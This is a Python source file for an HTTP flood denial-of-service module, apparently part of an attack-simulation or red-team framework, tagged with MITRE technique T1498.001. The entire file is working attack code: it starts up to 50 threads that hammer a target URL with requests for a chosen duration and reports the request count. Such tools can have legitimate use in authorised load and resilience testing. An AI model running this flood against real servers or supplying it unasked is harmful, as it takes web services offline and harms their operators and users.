"""DoS HTTP Flood — HTTP GET/POST flood using requests or raw sockets."""
from modules.attacks.base import BaseAttack, AttackResult, logger
import time
import threading


class DosHttpAttack(BaseAttack):
    name = "dos_http"
    description = "HTTP flood attack — saturates web server with requests"
    mitre_ref = "T1498.001"

    def run(self, target_ip: str, duration_s: int = 30, intensity: str = "medium",
            target_port: int = 80, path: str = "/", **kwargs) -> AttackResult:
        if not self.validate(target_ip):
            return AttackResult(success=False, error=f"Invalid IP: {target_ip}")
        threads = {"low": 2, "medium": 10, "high": 50}.get(intensity, 10)
        url = f"http://{target_ip}:{target_port}{path}"
        count = 0
        stop = threading.Event()
        lock = threading.Lock()

        def _worker():
            nonlocal count
            import urllib.request
            while not stop.is_set():
                try:
                    urllib.request.urlopen(url, timeout=2)
                except Exception:
                    pass
                with lock:
                    count += 1
        start = time.time()
        workers = [threading.Thread(target=_worker, daemon=True) for _ in range(threads)]
        for w in workers:
            w.start()
        stop.wait(timeout=duration_s)
        stop.set()
        for w in workers:
            w.join(timeout=2)
        elapsed = time.time() - start
        logger.info("HTTP flood: %d requests in %.1fs → %s", count, elapsed, url)
        return AttackResult(success=True, packets=count, duration=elapsed)
